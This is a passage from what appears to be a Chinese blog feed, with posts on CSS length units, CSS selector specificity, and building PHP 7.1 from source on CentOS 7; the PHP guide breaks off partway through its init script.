<iframe src="https://codepen.io/tutsplus/embed/xbZQRQ/" style="width:100%; height:30vh;" frameborder="no" allowfullscreen="true" scrolling="no">
</iframe>    

<p>虽然在某些情况下可能需要这个，但是通常你可能想基于一个唯一的度量标准来按比例缩放。在这种情况下，你应该用<code>rem</code>。<code>rem</code>中的”<code>r</code>“代表”<code>root</code>“；这等同于<code>font-size</code>基于根元素进行设置；在大多数情况下根元素为<code>html</code>元素。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.2rem</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上一个示例中三个嵌套的<code>div</code>的字体大小计算结果都为<code>16.8px</code>。</p>
<p><strong>对网格布局的好处</strong></p>
<p><code>rem</code>不是只对定义字体大小有用。比如，你可以使用<code>rem</code>把<a href="https://webdesign.tutsplus.com/tutorials/a-simple-mixin-alternative-to-standard-css-grids--webdesign-16958" target="_blank" rel="noopener">整个网格系统</a>或者UI样式库基于HTML根元素的字体大小上,然后在特定的地方使用<code>em</code>比例缩放。这将带给你更加可预测的字体大小和比例缩放。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    width: 70rem; // 70 * 14px = 980px</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从概念上讲，像这样一个策略背后的想法是为了允许你的界面随着你的内容按比例缩放。然而，这可能不一定对每个案例都有意义。</p>
<p><a href="http://caniuse.com/#feat=rem" target="_blank" rel="noopener">“rem(root em)单位”</a>的兼容性列表。</p>
<h3 id="vh-和-vw"><a href="#vh-和-vw" class="headerlink" title="vh 和 vw"></a>vh 和 vw</h3><p>响应式网页设计技术很大程度上依赖于比例规则。然而，CSS比例不总是每个问题的最佳解决方案。CSS宽度是相对于最近的包含父元素。如果你想使用显示窗口的宽度或高度而不是父元素的宽度将会怎么样？这正是<code>vh</code>和<code>vw</code>单位所提供的。</p>
<p><code>vh</code>等于viewport高度的<code>1/100</code>.例如，如果浏览器的高是<code>900px</code>,<code>1vh</code>求得的值为<code>9px</code>。同理，如果显示窗口宽度为<code>750px</code>,<code>1vw</code>求得的值为<code>7.5px</code>。</p>
<p>这些规则表面上看起来有无尽的用途。例如，做一个占满高度的或者接近占满高度的幻灯片，可以用一个非常简单的方法实现，只要用一行CSS：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.slide</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设想你想要一个占满屏幕宽度的标题。为做到这一点，你将会用<code>vw</code>来设置一个字体大小。这个大小将会随着浏览器的宽度按比例缩放。</p>
<iframe src="https://codepen.io/tutsplus/embed/gbPQga/" style="width:100%;height:30vh;" frameborder="no" allowfullscreen="true" scrolling="no">
</iframe>

<p><a href="http://caniuse.com/#feat=viewport-units" target="_blank" rel="noopener">视窗单位: <code>vw</code>, <code>vh</code></a>的兼容性列表。</p>
<h3 id="vmin-和-vmax"><a href="#vmin-和-vmax" class="headerlink" title="vmin 和 vmax"></a>vmin 和 vmax</h3><p><code>vh</code>和<code>vm</code>总是与视口的高度和宽度有关，与之不同的，<code>vmin</code>和<code>vmax</code>是与这次宽度和高度的最大值或最小值有关，取决于哪个更大和更小。例如，如果浏览器设置为<code>1100px</code>宽、<code>700px</code>高，<code>1vmin</code>会是<code>7px</code>,<code>1vmax</code>为<code>11px</code>。然而，如果宽度设置为<code>800px</code>，高度设置为<code>1080px</code>，<code>1vmin</code>将会等于<code>8px</code>而<code>1vmax</code>将会是<code>10.8px</code>。</p>
<p>所以你什么时候可能用到这些值？</p>
<p>设想你需要一个总是在屏幕上可见的元素。使用高度和宽度设置为低于<code>100</code>的<code>vmin</code>值将可以实现这个效果。例如，一个正方形的元素总是至少接触屏幕的两条边可能是这样定义的：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vmin</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100vmin</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/CSS计量单位/vmin.png" alt="vmin"></p>
<p>如果你需要一个总是覆盖可视窗口的正方形(一直接触屏幕的四条边),使用相同的规则只是把单位换成<code>vmax</code>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vmax</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100vmax</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/CSS计量单位/vmax.png" alt="vmax"></p>
<p>这些规则的组合提供了一个非常灵活的方式，用新的、令人兴奋的方式利用你的可视窗口的大小。</p>
<p><a href="http://caniuse.com/#feat=viewport-units" target="_blank" rel="noopener">Viewport units: vmin, vmax</a>兼容列表。</p>
<h3 id="ex-和-ch"><a href="#ex-和-ch" class="headerlink" title="ex 和 ch"></a>ex 和 ch</h3><p><code>ex</code>和<code>ch</code>单位，与<code>em</code>和<code>rem</code>相似，依赖于当前字体和字体大小。然而，与<code>em</code>和<code>rem</code>不同的是，这两个单位只也依赖于<code>font-family</code>，因为它们被定为基于特殊字体的法案。</p>
<p><code>ch</code>单位，或者字符单位被定义为<code>0</code>字符的宽度的“先进的尺寸”。在<a href="http://meyerweb.com/eric/thoughts/2012/05/15/defining-ch/" target="_blank" rel="noopener">“Eric Meyer’s的博客”</a>中可以找到一些非常有趣的讨论关于这意味着什么，但是基本的概念是，给定一个等宽字体的字体，一个N个字符单位宽的盒子，比如<code>width：40ch;</code>,可以一直容纳一个有<code>40</code>个字符的应用那个特定字体的字符串。虽然这个特殊规则的传统用途与列出盲文有关，但是这里创造性的可行性一定会超越这些简单的用途。</p>
<p><code>ex</code>单位被定义为”当前字体的<code>x-height</code>或者一个<code>em</code>的一半”。给定的字体的<code>x-height</code>是指那个字体的小写<code>x</code>的高度。通常，这是这个字体的中间的标志。</p>
<p><img src="/articles/CSS计量单位/x2.png" alt="ex"></p>
<p>x-height: 小写字母x的高度(阅读更多关于<a href="http://webdesign.tutsplus.com/articles/the-anatomy-of-web-typography--webdesign-10533" target="_blank" rel="noopener">The Anatomy of Web Typography</a>)</p>
<p>对于这种单位有很多的用途，大多数是用于排版的微调。例如，<code>sup</code>元素,代表_上标_，可以用相对定位和一个<code>1ex</code>的底部值在行内被推高。类似地，你可以拉低一个下标元素。浏览器默认支持这些利用上标和下标特性的<code>vertical-align</code>规则，但是如果你想要更精细的控制，你可以像这样更明确的处理样式：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">sup</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">1ex</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">sub</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">bottom</span>: -<span class="number">1ex</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ex</code>单位在<a href="http://www.w3.org/TR/REC-CSS1/#length-units" target="_blank" rel="noopener">CSS1</a>中已经存在，但是你不会找到对<code>ch</code>单位有像这样坚实的支持。具体支持，在Eric Meyer’s 的博客中查看<a href="http://www.quirksmode.org/css/units-values/" target="_blank" rel="noopener">CSS单位和值</a>。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>密切关注CSS的持续发展和扩张是非常重要的，一边在你的工具集里知道所有的工具。也许你会遇到一个特殊的问题需要一个意想不到的解决方案，利用这些更隐蔽的计量单位之一。花时间去阅读新规范，记录来自好的资源的新闻资讯！</p>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><ul>
<li><a href="https://webdesign.tutsplus.com/articles/taking-the-erm-out-of-ems--webdesign-12321" target="_blank" rel="noopener">Taking the “Erm..” Out of Ems</a></li>
<li><a href="https://webdesign.tutsplus.com/articles/taking-ems-even-further--webdesign-12543" target="_blank" rel="noopener">Taking Ems Even Further</a></li>
<li><a href="http://caniuse.com/#feat=viewport-units" target="_blank" rel="noopener">Caniuse Viewport units</a></li>
<li><a href="http://www.w3cplus.com/css/css-font-sizing.html" target="_blank" rel="noopener">CSS的font-size属性</a></li>
<li><a href="http://www.w3cplus.com/css/r-i-p-rem-viva-css-reference-pixel.html" target="_blank" rel="noopener">Rem VS Px</a></li>
<li><a href="http://www.w3cplus.com/css/the-lengths-of-css.html" target="_blank" rel="noopener">CSS的长度单位</a></li>
<li><a href="http://www.w3cplus.com/css3/define-font-size-with-css3-rem" target="_blank" rel="noopener">CSS3的REM设置字体大小</a></li>
<li><a href="http://www.w3cplus.com/css/px-to-em" target="_blank" rel="noopener">CSS中强大的EM</a></li>
</ul>
<blockquote>
<p>本文根据<a href="http://tutsplus.com/authors/jonathan-cutrell" target="_blank" rel="noopener">@Jonathan Cutrell</a>的《<a href="http://webdesign.tutsplus.com/articles/7-css-units-you-might-not-know-about--cms-22573" target="_blank" rel="noopener">7 CSS Units You Might Not Know About</a>》所译。</p>
</blockquote>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>CSS选择器优先级</title>
    <url>/articles/CSS%E9%80%89%E6%8B%A9%E5%99%A8%E4%BC%98%E5%85%88%E7%BA%A7/</url>
    <content><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSS选择器的优先级关系是:</p>
<blockquote>
<p>内联 &gt; ID选择器 &gt; 类选择器 &gt; 标签选择器</p>
</blockquote>
<p>《CSS REFACTORING》 中提到了算法的过程 :</p>
<blockquote>
<p>   A specificity is determined by plugging numbers into (a, b, c, d):</p>
<p>   If the styles are applied via the style attribute, a=1; otherwise, a=0.<br>   b is equal to the number of ID selectors present.<br>   c is equal to the number of class selectors, attribute selectors, and pseudoclasses present.<br>   d is equal to the number of type selectors and pseudoelements present.</p>
</blockquote>
<p>即优先级是由 A 、B、C、D 的值来决定的，其中它们的值计算规则如下：</p>
<ul>
<li><p>如果存在内联样式，那么 A = 1, 否则 A = 0;</p>
</li>
<li><p>B 的值等于 ID选择器 出现的次数;</p>
</li>
<li><p>C 的值等于 类选择器 和 属性选择器 和 伪类 出现的总次数;</p>
</li>
<li><p>D 的值等于 标签选择器 和 伪元素 出现的总次数 。</p>
</li>
</ul>
<p>例如：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">li</span>                                  <span class="comment">/* (0, 0, 0, 1) */</span></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span>                               <span class="comment">/* (0, 0, 0, 2) */</span></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">ol</span>+<span class="selector-tag">li</span>                            <span class="comment">/* (0, 0, 0, 3) */</span></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">ol</span>+<span class="selector-tag">li</span>                            <span class="comment">/* (0, 0, 0, 3) */</span></span><br><span class="line"><span class="selector-tag">h1</span> + *<span class="selector-attr">[REL=up]</span>                      <span class="comment">/* (0, 0, 1, 1) */</span></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">ol</span> <span class="selector-tag">li</span><span class="selector-class">.red</span>                        <span class="comment">/* (0, 0, 1, 3) */</span></span><br><span class="line"><span class="selector-tag">li</span><span class="selector-class">.red</span><span class="selector-class">.level</span>                        <span class="comment">/* (0, 0, 2, 1) */</span></span><br><span class="line"><span class="selector-tag">a1</span><span class="selector-class">.a2</span><span class="selector-class">.a3</span><span class="selector-class">.a4</span><span class="selector-class">.a5</span><span class="selector-class">.a6</span><span class="selector-class">.a7</span><span class="selector-class">.a8</span><span class="selector-class">.a9</span><span class="selector-class">.a10</span><span class="selector-class">.a11</span>  <span class="comment">/* (0, 0, 11,0) */</span></span><br><span class="line"><span class="selector-id">#x34y</span>                               <span class="comment">/* (0, 1, 0, 0) */</span></span><br><span class="line"><span class="selector-tag">li</span><span class="selector-pseudo">:first-child</span> <span class="selector-tag">h2</span> <span class="selector-class">.title</span>            <span class="comment">/* (0, 0, 2, 2) */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.selected</span> &gt; <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>            <span class="comment">/* (0, 1, 2, 1) */</span></span><br><span class="line"><span class="selector-tag">html</span> <span class="selector-tag">body</span> <span class="selector-id">#nav</span> <span class="selector-class">.selected</span> &gt; <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>  <span class="comment">/* (0, 1, 2, 3) */</span></span><br></pre></td></tr></table></figure>

<p>优先级比较规则：</p>
<blockquote>
<p>从左往右依次进行比较 ，较大者胜出，如果相等，则继续往右移动一位进行比较 。如果4位全部相等，则后面的会覆盖前面的</p>
</blockquote>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>有如下html代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"b"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"a"</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>ALink<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果设置css样式：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#b</span> <span class="selector-tag">a</span> &#123;<span class="attribute">color</span>:red;&#125;</span><br><span class="line"><span class="selector-id">#a</span> &#123;<span class="attribute">color</span>: green;&#125;</span><br></pre></td></tr></table></figure>

<p>问题：<code>#b a</code>生效，还是<code>#a</code>生效?</p>
<p>答案：<font style="color:red;">ALink</font></p>
<p>解析：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#b</span> <span class="selector-tag">a</span>  <span class="comment">/* (0, 1, 0, 1) */</span></span><br><span class="line"><span class="selector-id">#a</span>    <span class="comment">/* (0, 1, 0, 0) */</span></span><br></pre></td></tr></table></figure>

<p>比较得出 <code>#b a</code>优先级更高</p>
<h4 id="特例"><a href="#特例" class="headerlink" title="特例"></a>特例</h4><p>如果我们给#a的css后加上<code>!important</code></p>
<p>那么#a的优先级变为最高，甚至比在html标签上加style的优先级还要高。</p>
<p>比如如下代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#a</span>&#123; <span class="attribute">color</span>: green <span class="meta">!important</span>; &#125;  </span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"b"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"a"</span> <span class="attr">style</span>=<span class="string">"color:blue"</span>&gt;</span>ALink<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>显示的结果 <font style="color:green;font-weight:blod;" title="color:green">ALink</font><br>如果在标签内联样式加入<code>!important</code>那么显示 <font style="color:blue;font-weight:blod;" title="color:blue">ALink</font></p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>Centos7   安装PHP</title>
    <url>/articles/Centos7%20%20%20%E5%AE%89%E8%A3%85PHP/</url>
    <content><![CDATA[<p>1、首先官网下载<a href="http://php.net/downloads.php" target="_blank" rel="noopener">php</a></p>
<blockquote>
<p>wget <a href="http://cn2.php.net/distributions/php-7.1.27.tar.gz" target="_blank" rel="noopener">http://cn2.php.net/distributions/php-7.1.27.tar.gz</a></p>
</blockquote>
<p>下载后，解压到服务器<code>/usr/src</code>目录 : <code>tar -zxvf php-7.1.27.tar.gz</code></p>
<p>2、 添加www用户</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># groupadd www</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># useradd -g www www</span></span><br></pre></td></tr></table></figure>

<p>3、完了后，configure编译，如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./configure \</span></span><br><span class="line"></span><br><span class="line">--prefix=/usr/<span class="built_in">local</span>/php \</span><br><span class="line"></span><br><span class="line">--with-config-file-path=/usr/<span class="built_in">local</span>/php/etc \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-inline-optimization \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">disable</span>-debug \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">disable</span>-rpath \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-shared \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-opcache \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-fpm \</span><br><span class="line"></span><br><span class="line">--with-fpm-user=www \</span><br><span class="line"></span><br><span class="line">--with-fpm-group=www \</span><br><span class="line"></span><br><span class="line">--with-mysql=mysqlnd \</span><br><span class="line"></span><br><span class="line">--with-mysqli=mysqlnd \</span><br><span class="line"></span><br><span class="line">--with-pdo-mysql=mysqlnd \</span><br><span class="line"></span><br><span class="line">--with-gettext \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-mbstring \</span><br><span class="line"></span><br><span class="line">--with-iconv \</span><br><span class="line"></span><br><span class="line">--with-mcrypt \</span><br><span class="line"></span><br><span class="line">--with-mhash \</span><br><span class="line"></span><br><span class="line">--with-openssl \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-bcmath \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-soap \</span><br><span class="line"></span><br><span class="line">--with-libxml-dir \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-pcntl \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-shmop \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-sysvmsg \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-sysvsem \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-sysvshm \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-sockets \</span><br><span class="line"></span><br><span class="line">--with-curl \</span><br><span class="line"></span><br><span class="line">--with-zlib \</span><br><span class="line"></span><br><span class="line">--<span class="built_in">enable</span>-zip \</span><br><span class="line"></span><br><span class="line">--with-bz2 \</span><br><span class="line"></span><br><span class="line">--with-readline</span><br></pre></td></tr></table></figure>

<p>不好粘贴就复制下面的：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/php --with-config-file-path=/usr/<span class="built_in">local</span>/php/etc --<span class="built_in">enable</span>-inline-optimization --<span class="built_in">disable</span>-debug --<span class="built_in">disable</span>-rpath --<span class="built_in">enable</span>-shared --<span class="built_in">enable</span>-opcache --<span class="built_in">enable</span>-fpm --with-fpm-user=www --with-fpm-group=www --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-gettext --<span class="built_in">enable</span>-mbstring --with-iconv --with-mcrypt --with-mhash --with-openssl --<span class="built_in">enable</span>-bcmath --<span class="built_in">enable</span>-soap --with-libxml-dir --<span class="built_in">enable</span>-pcntl --<span class="built_in">enable</span>-shmop --<span class="built_in">enable</span>-sysvmsg --<span class="built_in">enable</span>-sysvsem --<span class="built_in">enable</span>-sysvshm --<span class="built_in">enable</span>-sockets --with-curl --with-zlib --<span class="built_in">enable</span>-zip --with-bz2 --with-readline --with-gd --<span class="built_in">enable</span>-gd-native-ttf --<span class="built_in">enable</span>-gd-jis-conv</span><br></pre></td></tr></table></figure>

<p>这个命令出现的错误直接<a href="https://www.baidu.com/" target="_blank" rel="noopener">百度</a>就能解决。</p>
<p>4、安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line"></span><br><span class="line">make <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>出现以下表示安装成功</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@xxx bin]<span class="comment"># ./php -version</span></span><br><span class="line"></span><br><span class="line">PHP 7.1.27 (cli) (built: Mar 11 2019 14:55:23) ( NTS )</span><br><span class="line"></span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line"></span><br><span class="line">Zend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies</span><br></pre></td></tr></table></figure>

<p>5、 配置php-fpm 服务，自启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cp php.ini-development /usr/<span class="built_in">local</span>/php/etc/php.ini</span><br></pre></td></tr></table></figure>

<p>设置开机启动项的步骤和原理都是一样的，这里不再累赘太多，我直接上重点。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/init.d/php-fpm</span><br></pre></td></tr></table></figure>

<p>然后加入下面的脚本：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># nginx - this script starts and stops the nginx daemon</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chkconfig:   - 85 15</span></span><br><span class="line"><span class="comment"># description:  NGINX is an HTTP(S) server, HTTP(S) reverse \</span></span><br><span class="line"><span class="comment">#               proxy and IMAP/POP3 proxy server</span></span><br><span class="line"><span class="comment"># processname: nginx</span></span><br><span class="line"><span class="comment"># config:      /etc/nginx/nginx.conf</span></span><br><span class="line"><span class="comment"># config:      /etc/sysconfig/nginx</span></span><br><span class="line"><span class="comment"># pidfile:     /var/run/nginx.pid</span></span><br><span class="line"><span class="comment"># Source function library.</span></span><br><span class="line">. /etc/rc.d/init.d/<span class="built_in">functions</span></span><br><span class="line"><span class="comment"># Source networking configuration.</span></span><br><span class="line">. /etc/sysconfig/network</span><br><span class="line"><span class="comment"># Check that networking is up.</span></span><br><span class="line">[ <span class="string">"<span class="variable">$NETWORKING</span>"</span> = <span class="string">"no"</span> ] &amp;&amp; <span class="built_in">exit</span> 0</span><br><span class="line">nginx=<span class="string">"/usr/sbin/nginx"</span></span><br><span class="line">prog=$(basename <span class="variable">$nginx</span>)</span><br><span class="line">NGINX_CONF_FILE=<span class="string">"/etc/nginx/nginx.conf"</span></span><br><span class="line">[ -f /etc/sysconfig/nginx ] &amp;&amp; . /etc/sysconfig/nginx</span><br><span class="line">lockfile=/var/lock/subsys/nginx</span><br><span class="line"><span class="function"><span class="title">make_dirs</span></span>() &#123;</span><br><span class="line">   <span class="comment"># make required directories</span></span><br><span class="line">   user=`<span class="variable">$nginx</span> -V 2&gt;&amp;1 | grep <span class="string">"configure arguments:"</span> | sed <span class="string">'s/[^*]*--user=\([^ ]*\).*/\1/g'</span> -`</span><br><span class="line">   <span class="keyword">if</span> [ -z <span class="string">"`grep <span class="variable">$user</span> /etc/passwd`"</span> ]; <span class="keyword">then</span></span><br><span class="line">       useradd -M -s /bin/nologin <span class="variable">$user</span></span><br><span class="line">   <span class="keyword">fi</span></span><br><span class="line">   options=`<span class="variable">$nginx</span> -V 2&gt;&amp;1 | grep <span class="string">'configure arguments:'</span>`</span><br><span class="line">   <span class="keyword">for</span> opt <span class="keyword">in</span> <span class="variable">$options</span>; <span class="keyword">do</span></span><br><span class="line">       <span class="keyword">if</span> [ `<span class="built_in">echo</span> <span class="variable">$opt</span> | grep <span class="string">'.*-temp-path'</span>` ]; <span class="keyword">then</span></span><br><span class="line">           value=`<span class="built_in">echo</span> <span class="variable">$opt</span> | cut -d <span class="string">"="</span> -f 2`</span><br><span class="line">           <span class="keyword">if</span> [ ! -d <span class="string">"<span class="variable">$value</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">               <span class="comment"># echo "creating" $value</span></span><br><span class="line">               mkdir -p <span class="variable">$value</span> &amp;&amp; chown -R <span class="variable">$user</span> <span class="variable">$value</span></span><br><span class="line">           <span class="keyword">fi</span></span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line">   <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">start</span></span>() &#123;</span><br><span class="line">    [ -x <span class="variable">$nginx</span> ] || <span class="built_in">exit</span> 5</span><br><span class="line">    [ -f <span class="variable">$NGINX_CONF_FILE</span> ] || <span class="built_in">exit</span> 6</span><br><span class="line">    make_dirs</span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Starting <span class="variable">$prog</span>: "</span></span><br><span class="line">    daemon <span class="variable">$nginx</span> -c <span class="variable">$NGINX_CONF_FILE</span></span><br><span class="line">    retval=$?</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    [ <span class="variable">$retval</span> -eq 0 ] &amp;&amp; touch <span class="variable">$lockfile</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$retval</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">stop</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Stopping <span class="variable">$prog</span>: "</span></span><br><span class="line">    killproc <span class="variable">$prog</span> -QUIT</span><br><span class="line">    retval=$?</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    [ <span class="variable">$retval</span> -eq 0 ] &amp;&amp; rm -f <span class="variable">$lockfile</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$retval</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">restart</span></span>() &#123;</span><br><span class="line">    configtest || <span class="built_in">return</span> $?</span><br><span class="line">    stop</span><br><span class="line">    sleep 1</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">reload</span></span>() &#123;</span><br><span class="line">    configtest || <span class="built_in">return</span> $?</span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Reloading <span class="variable">$prog</span>: "</span></span><br><span class="line">    killproc <span class="variable">$nginx</span> -HUP</span><br><span class="line">    RETVAL=$?</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">force_reload</span></span>() &#123;</span><br><span class="line">    restart</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">configtest</span></span>() &#123;</span><br><span class="line">  <span class="variable">$nginx</span> -t -c <span class="variable">$NGINX_CONF_FILE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">rh_status</span></span>() &#123;</span><br><span class="line">    status <span class="variable">$prog</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">rh_status_q</span></span>() &#123;</span><br><span class="line">    rh_status &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">    start)</span><br><span class="line">        rh_status_q &amp;&amp; <span class="built_in">exit</span> 0</span><br><span class="line">        <span class="variable">$1</span></span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 0</span><br><span class="line">        <span class="variable">$1</span></span><br><span class="line">        ;;</span><br><span class="line">    restart|configtest)</span><br><span class="line">        <span class="variable">$1</span></span><br><span class="line">        ;;</span><br><span class="line">    reload)</span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 7</span><br><span class="line">        <span class="variable">$1</span></span><br><span class="line">        ;;</span><br><span class="line">    force-reload)</span><br><span class="line">        force_reload</span><br><span class="line">        ;;</span><br><span class="line">    status)</span><br><span class="line">        rh_status</span><br><span class="line">        ;;</span><br><span class="line">    condrestart|try-restart)</span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 0</span><br><span class="line">            ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> $<span class="string">"Usage: <span class="variable">$0</span> 